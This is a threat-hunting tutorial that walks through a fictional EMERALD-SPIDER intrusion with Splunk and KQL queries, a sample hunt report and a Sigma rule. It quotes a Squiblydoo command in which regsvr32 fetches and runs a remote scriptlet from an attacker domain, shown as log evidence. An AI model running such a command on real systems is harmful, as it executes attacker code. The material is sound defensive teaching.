# Guide 04: Conducting a Hypothesis-Driven Hunt

**Level:** Intermediate

**Estimated Time:** 60 minutes

**Goal:** Execute a complete hypothesis-driven threat hunt from intelligence receipt to documented findings, including query writing, analysis, and detection creation

**Prerequisites:** Guide 01 (Methodology), Guide 02 (MISP), basic SIEM familiarity

---

## Overview

This guide takes you through a complete, realistic hypothesis-driven hunt.
You will:

1. Receive threat intelligence and develop hypotheses
1. Write and execute hunting queries
1. Analyze results and investigate findings
1. Document the hunt and create follow-on detections

**Scenario:** Your organization has received intelligence that a threat actor group is targeting companies in your sector using a specific technique chain.
You need to determine if they are already in your environment.

---

## Part 1: Intelligence Analysis

### Receiving the Intelligence

**Intelligence Report (TLP:AMBER):**

> **SUBJECT: EMERALD-SPIDER Credential Harvesting Activity in Manufacturing Sector**
>
> EMERALD-SPIDER, a financially-motivated threat group, has been conducting targeted intrusions against manufacturing companies. The group gains initial access via spear-phishing with weaponized ISO files containing LNK shortcuts. Post-exploitation activities follow this pattern:
>
> 1. **Initial execution via LNK**: `.lnk` files in ISO mounting trigger `cmd.exe` or `mshta.exe`
> 2. **WDAC/AMSI bypass**: Group uses `regsvr32.exe` with scrobj.dll for defense evasion
> 3. **Credential harvesting**: Dumps credentials using NTDS.dit extraction (not Mimikatz)
> 4. **C2 via DNS tunneling**: Uses DNS TXT records for C2 communication (dnscat2 or custom)
> 5. **Persistence via COM hijacking**: Modifies `HKCU\SOFTWARE\Classes\CLSID\` keys
>
> **Observed IOCs:**
> - Domains using DNS TXT records: `telemetry-collector[.]io`, `dns-monitor[.]cloud`
> - Registry key pattern: `HKCU\SOFTWARE\Classes\CLSID\{GUID with high entropy}`

### Step 1: Extract and Map TTPs

| # | Technique | ATT&CK ID | Tactic |
|---|-----------|-----------|--------|
| 1 | LNK Execution | T1204.002 | Execution |
| 2 | ISO Mounting (bypass mark-of-web) | T1553.005 | Defense Evasion |
| 3 | Regsvr32 (Squiblydoo) | T1218.010 | Defense Evasion |
| 4 | NTDS.dit extraction | T1003.003 | Credential Access |
| 5 | DNS Tunneling C2 | T1071.004 | C2 |
| 6 | COM Hijacking | T1546.015 | Persistence |

### Step 2: Priority Matrix

Prioritize by **huntability** (data available) × **impact** (severity if found):

| TTP | Data Available | Impact | Priority | Primary Data Source |
|-----|---------------|--------|----------|-------------------|
| Regsvr32 abuse | High (Sysmon/4688) | High | **1** | Sysmon EID 1, 7 |
| DNS Tunneling | Medium (DNS logs) | High | **2** | DNS query logs |
| COM Hijacking | High (Sysmon/Registry) | Medium | **3** | Sysmon EID 13 |
| NTDS extraction | Medium (4662, Sysmon) | Critical | **4** | Security EID 4662 |
| LNK execution | High (Sysmon/4688) | Medium | **5** | Sysmon EID 1 |

---

## Part 2: Hypothesis Development

### Hypothesis 1: Regsvr32 Defense Evasion

**Hypothesis Statement:**
> "If EMERALD-SPIDER is active in our environment using regsvr32 for defense evasion (T1218.010), I would expect to observe `regsvr32.exe` executing with `/s`, `/n`, `/u`, or remote URL arguments, particularly loading `.sct` or `.dll` files from temp directories or network paths, in Sysmon Event ID 1 logs across all workstations over the last 30 days."

**Key indicators:**

* `regsvr32.exe /s /n /u /i:http://` (the classic Squiblydoo pattern)
* `regsvr32.exe` loading DLLs from `%TEMP%`, `%APPDATA%`, or UNC paths
* `regsvr32.exe` spawned by unusual parents (mshta.exe, wscript.exe)
* `regsvr32.exe` spawning network connections (Sysmon EID 3)

**Baseline:** In our environment, regsvr32.exe is used by:

* Software installers (high frequency, predictable parent processes)
* COM component registration (SYSTEM context, system32 paths)

### Hypothesis 2: DNS Tunneling C2

**Hypothesis Statement:**
> "If EMERALD-SPIDER is using DNS tunneling for C2 (T1071.004), I would expect to see unusually high volumes of DNS TXT record queries from individual hosts, queries for domains with high-entropy random subdomains, or queries to newly registered domains, visible in DNS query logs over the last 30 days."

**Key indicators:**

* DNS TXT record queries (type 16) - most legitimate traffic uses A, AAAA, CNAME
* High rate of DNS queries from a single host to the same domain
* Long subdomain strings with high character entropy (random-looking)
* Queries to `telemetry-collector[.]io` or `dns-monitor[.]cloud` (from IOCs)

**Baseline:** Normal DNS TXT query rate per workstation is < 50/day.

### Hypothesis 3: COM Hijacking Persistence

**Hypothesis Statement:**
> "If EMERALD-SPIDER has established persistence via COM hijacking (T1546.015), I would expect to find registry write events (Sysmon Event ID 13) targeting `HKCU\SOFTWARE\Classes\CLSID\` keys with GUIDs that do not match any known legitimate software CLSID, over the last 30 days."

---

## Part 3: Writing Hunting Queries

### Query Set 1: Regsvr32 Hunting

**Query 1a: Regsvr32 with network or unusual arguments**

```splunk
# Splunk SPL
index=sysmon EventID=1
  Image="*\\regsvr32.exe"
  (CommandLine="*/s*" OR CommandLine="*/n*" OR CommandLine="*/u*")
  (CommandLine="*http://*" OR CommandLine="*https://*" OR
   CommandLine="*\\\\*" OR CommandLine="*%temp%*" OR
   CommandLine="*appdata*" OR CommandLine="*.sct*")
| table _time, ComputerName, User, CommandLine, ParentImage
| sort _time desc
```

```kql
# Microsoft Sentinel KQL equivalent
SecurityEvent
| where TimeGenerated >= ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\regsvr32.exe"
| where CommandLine has_any ("/s", "/n", "/u")
| where CommandLine has_any ("http://", "https://", "\\\\", ".sct", "%temp%")
| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName
| order by TimeGenerated desc
```

**Query 1b: Regsvr32 spawning network connections**

```splunk
# Sysmon EID 3: NetworkConnect from regsvr32
index=sysmon EventID=3 Image="*\\regsvr32.exe"
| where Initiated="true"
| where NOT (DestinationIp IN ("127.0.0.1", "::1"))
| table _time, ComputerName, User, DestinationIp, DestinationHostname, DestinationPort
| sort _time desc
```

**Query 1c: Regsvr32 loading DLLs from suspicious locations (ImageLoad)**

```splunk
# Sysmon EID 7: ImageLoad
index=sysmon EventID=7 Image="*\\regsvr32.exe"
  (ImageLoaded="*\\AppData\\*" OR ImageLoaded="*\\Temp\\*" OR
   ImageLoaded="*\\ProgramData\\*")
  (NOT ImageLoaded="*\\Microsoft\\*")
| table _time, ComputerName, User, ImageLoaded, Signed, SignatureStatus
| sort _time desc
```

---

### Query Set 2: DNS Tunneling Detection

**Query 2a: DNS TXT record queries**

```splunk
# DNS TXT record queries (type 16)
index=dns
| where query_type="TXT" OR query_type="16"
| stats count as txt_queries by src_ip, query
| where txt_queries > 5
| sort -txt_queries
```

**Query 2b: High-entropy subdomain detection**

This requires calculating string entropy (randomness):

```python
# Python helper: calculate Shannon entropy of a string
import math
from collections import Counter

def entropy(string):
    """Calculate Shannon entropy of a string"""
    if not string:
        return 0
    counts = Counter(string.lower())
    length = len(string)
    return -sum((c/length) * math.log2(c/length) for c in counts.values())

# Example
examples = [
    "www",                    # entropy: 1.0 (low, predictable)
    "api",                    # entropy: 1.58 (low)
    "a1b2c3d4e5f6g7h8",       # entropy: ~4.0 (medium-high)
    "xkq72jfmn0asdf23lkj98",  # entropy: ~4.5 (high, suspicious)
]

for e in examples:
    print(f"'{e}': entropy = {entropy(e):.2f}")
```

```splunk
# Splunk: find high-entropy DNS queries
index=dns
| rex field=query "^(?P<subdomain>[^.]+)\."
| eval subdomain_len=len(subdomain)
| where subdomain_len > 20  # Long subdomains are suspicious
| stats count by query, subdomain, subdomain_len, src_ip
| sort -count
```

**Query 2c: Known-malicious domain IOC hunt**

```splunk
# Hunt for specific IOC domains from the intel report
index=dns
  (query="telemetry-collector.io" OR query="dns-monitor.cloud" OR
   query="*.telemetry-collector.io" OR query="*.dns-monitor.cloud")
| table _time, src_ip, src_host, query, answer
| sort _time desc
```

**Query 2d: High DNS query rate (possible tunneling)**

```splunk
# Hosts with unusually high DNS query rates
index=dns
| stats count as query_count by src_ip, src_host
| eventstats avg(query_count) as avg_queries, stdev(query_count) as stdev_queries
| eval z_score = (query_count - avg_queries) / stdev_queries
| where z_score > 3  # More than 3 standard deviations above mean
| sort -query_count
| table src_ip, src_host, query_count, avg_queries, z_score
```

---

### Query Set 3: COM Hijacking Detection

**Query 3a: Registry writes to HKCU CLSID**

```splunk
# Sysmon EID 13: RegistryEvent (Value Set)
index=sysmon EventID=13
  TargetObject="*\\SOFTWARE\\Classes\\CLSID\\*"
  (NOT Image="*\\msiexec.exe")
  (NOT Image="*\\regsvr32.exe")  # We're already hunting this
  (NOT TargetObject="*InprocServer32*MicrosoftEdge*")  # Exclude browser
| table _time, ComputerName, User, Image, TargetObject, Details
| sort _time desc
```

**Query 3b: New CLSID registrations (persistence check)**

```splunk
# Look for CLSID creations in user registry (not system-wide)
index=sysmon (EventID=12 OR EventID=13)
  TargetObject="*HKCU\\SOFTWARE\\Classes\\CLSID\\*"
| stats count by TargetObject, Image, User, ComputerName
| where count < 5  # Rare = suspicious
| sort count
```

---

## Part 4: Analysis Workflow

### Analysis Workflow

```text
For each query result:

1. INITIAL TRIAGE

   ├─ Is this a known-false-positive? → Document, skip
   ├─ Is the process/path expected? → Confirm with baseline
   └─ Is anything unusual? → Proceed to Step 2

2. CONTEXTUAL ANALYSIS
   ├─ Who is the user? Normal employee or service account?
   ├─ What time did this occur? Business hours or off-hours?
   ├─ What system? Workstation, server, critical asset?
   └─ Is there a business reason? (Check change management, IT tickets)

3. PIVOTING (if still suspicious)
   ├─ Timeline: What happened before and after this event?
   ├─ Lateral: Did this user/system do anything else unusual?
   ├─ Network: Did the system make any unusual network connections?
   └─ Files: Were any files created/modified around this time?

4. DECISION
   ├─ CONFIRMED BENIGN → Document, add to whitelist
   ├─ SUSPICIOUS → Gather more evidence, request more context
   └─ MALICIOUS → Escalate to incident response immediately
```

### Sample Finding Analysis

Imagine Query 1a returns this result:

```text
Time:        2024-03-15 22:41:05
ComputerName: WORKSTATION-WH-012
User:        CORP\m.johnson
CommandLine: regsvr32.exe /s /n /u /i:https://update-secure-cdn.com/scrobj.dll scrobj.dll
ParentImage: C:\Windows\System32\mshta.exe
```

**Analysis:**

1. **Initial assessment:** Regsvr32 loading a DLL from a remote URL is highly suspicious. The URL matches our IOC from the intelligence report.

1. **Contextual questions:**
   * User `m.johnson`: Does this user normally use regsvr32? Unlikely for most employees.
   * Time `22:41:05`: After business hours on a weekday - very suspicious.
   * Parent `mshta.exe`: MSHTA is a known LOLBin used by attackers.
   * URL: `update-secure-cdn.com` is in our IOC list as EMERALD-SPIDER infrastructure.

1. **Pivoting:**

```splunk
# What else happened on WORKSTATION-WH-012 around that time?
index=sysmon ComputerName="WORKSTATION-WH-012"
  earliest="2024-03-15T22:30:00" latest="2024-03-15T23:00:00"
| table _time, EventID, Image, CommandLine, TargetObject, DestinationIp
| sort _time
```

1. **Decision:** This is almost certainly MALICIOUS. Escalate to incident response.

---

## Part 5: Hunt Documentation

### Complete Hunt Report

```markdown
# Hunt Report: HUNT-2024-023

## Classification: TLP:AMBER

## Executive Summary

A hypothesis-driven hunt was conducted following receipt of intelligence
about EMERALD-SPIDER targeting manufacturing organizations. Investigation
of Regsvr32 abuse hypothesis resulted in one confirmed True Positive on
WORKSTATION-WH-012, indicating active compromise. DNS tunneling and COM
hijacking hypotheses returned no findings.

**Immediate Action Required:** WORKSTATION-WH-012 is actively compromised.
Incident response team engaged (IR-2024-089).

---

## Hunt Details

| Field | Value |
|-------|-------|
| Hunt ID | HUNT-2024-023 |
| Trigger | EMERALD-SPIDER threat intelligence (TLP:AMBER) |
| Start Date | 2024-03-15 |
| End Date | 2024-03-16 |
| Time Window | 2024-02-15 to 2024-03-15 (30 days) |
| Scope | All Windows workstations and servers (1,247 systems) |
| Data Sources | Sysmon, DNS Logs, Windows Security Events |
| Priority | HIGH |
| Hunter | [Analyst Name] |

---

## Hypotheses Tested

### H1: Regsvr32 Defense Evasion (T1218.010)
**Status:** TRUE POSITIVE CONFIRMED

**Evidence:**
```

2024-03-15 22:41:05 WORKSTATION-WH-012 CORP\m.johnson
regsvr32.exe /s /n /u /i:https://update-secure-cdn.com/scrobj.dll scrobj.dll
Parent: C:\Windows\System32\mshta.exe

```text
- URL matches confirmed EMERALD-SPIDER IOC
- Parent process (mshta.exe) consistent with group TTPs
- After-hours execution (22:41) raises suspicion
- Subsequent timeline shows COM hijacking registry writes 4 minutes later

**Action Taken:** Incident response escalated (IR-2024-089). System isolated.

---

### H2: DNS Tunneling C2 (T1071.004)
**Status:** NEGATIVE (No Finding)

**Queries run:** 4 queries, 30-day window
**Results:**
- No DNS TXT queries above baseline threshold
- No high-entropy subdomains detected
- Specific IOC domains not found in DNS logs

**Confidence:** Medium (DNS logging has 15% gap - 189 hosts not sending DNS logs)

**Data Gap:** 189 workstations not forwarding DNS logs to SIEM.

---

### H3: COM Hijacking (T1546.015)
**Status:** NEGATIVE (except for confirmed TP system)

**Note:** WORKSTATION-WH-012 shows COM hijacking registry writes
(confirmed as part of the active intrusion). All other systems clean.

---

## Coverage Gaps Identified

1. **DNS Logging Gap:** 189 workstations not forwarding DNS logs

   - Action: IT ticket IT-2024-0892 - Enable WEF for DNS client logs
   - Impact: DNS tunneling hunt was incomplete due to this gap
   - Risk: MEDIUM (if attacker used DNS C2 on ungapped hosts, we wouldn't know)

2. **ISO File Monitoring:** No detection for ISO mounting
   - Action: Enable Sysmon filter for virtual disk mounts
   - Risk: We don't know if EMERALD-SPIDER's ISO delivery method was used

---

## New Detection Rules Created

1. **Sigma Rule: Regsvr32 Remote URL Load** (created, pending deployment)

   - File: sigma/regsvr32_remote_load.yml

2. **SIEM Alert: DNS TXT Query Rate Anomaly** (draft, needs baseline tuning)
   - Alert when host exceeds 100 TXT queries/day

---

## Metrics

| Metric | Value |
|--------|-------|
| Hypotheses tested | 3 |
| Total events analyzed | ~45,000 |
| True positives | 1 (WORKSTATION-WH-012) |
| False positives | 2 (Legitimate software installer use of regsvr32) |
| Data gaps identified | 2 |
| New detection rules | 2 |
| Time spent | 6.5 hours |
| Incident response escalations | 1 |
```

---

## Part 6: Converting Findings to Detections

Every confirmed TTP must become an automated detection:

### From Hunt Finding to Sigma Rule

```yaml
title: Regsvr32 Loading Remote Script (T1218.010)
id: 7b8e4d2a-6c9f-4e1d-8a3b-2c5d7e8f9a0b
status: stable
description: |
  Detects regsvr32.exe loading a script or DLL from a remote URL
  or unusual local path. This technique (Squiblydoo) is used to
  bypass application whitelisting and WDAC.

  EMERALD-SPIDER was observed using this technique for defense evasion.
references:
    - https://attack.mitre.org/techniques/T1218/010/
    - https://attack.mitre.org/groups/G0016/
author: Threat Hunt Team
date: 2024/03/16
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains:
            - '/i:http'     # Remote URL
            - '/i:ftp'      # Remote FTP
            - '/i:\\\\'     # UNC path
            - '.sct'        # Scriptlet file
    condition: selection
falsepositives:
    - Very rare legitimate use of remote COM registration
level: high
tags:
    - attack.defense_evasion
    - attack.t1218.010
```

### Deploying the Detection

```console
# Convert to Splunk
sigma-cli convert -t splunk regsvr32_remote_load.yml

# Deploy as saved search in Splunk
# (Add to searches.conf or via the GUI)
```

---

## Summary

This guide walked you through a complete hypothesis-driven threat hunt:

1. **Intelligence analysis** - Extracted TTPs, mapped to ATT&CK
1. **Hypothesis development** - Wrote 3 specific, testable hypotheses
1. **Query writing** - Created hunting queries for Splunk and KQL
1. **Analysis workflow** - Applied systematic analysis to findings
1. **Finding investigation** - Pivoted from initial hit to full scope
1. **Documentation** - Produced a complete hunt report
1. **Detection creation** - Converted findings to Sigma rules

**Key lessons:**

* Good hypotheses make analysis faster and more accurate
* Document everything, including negative results and data gaps
* Every confirmed finding should produce at least one new detection
* Data gaps are findings—they represent blind spots in your coverage
* Scope your hunt clearly before starting; it's easy to expand, hard to shrink
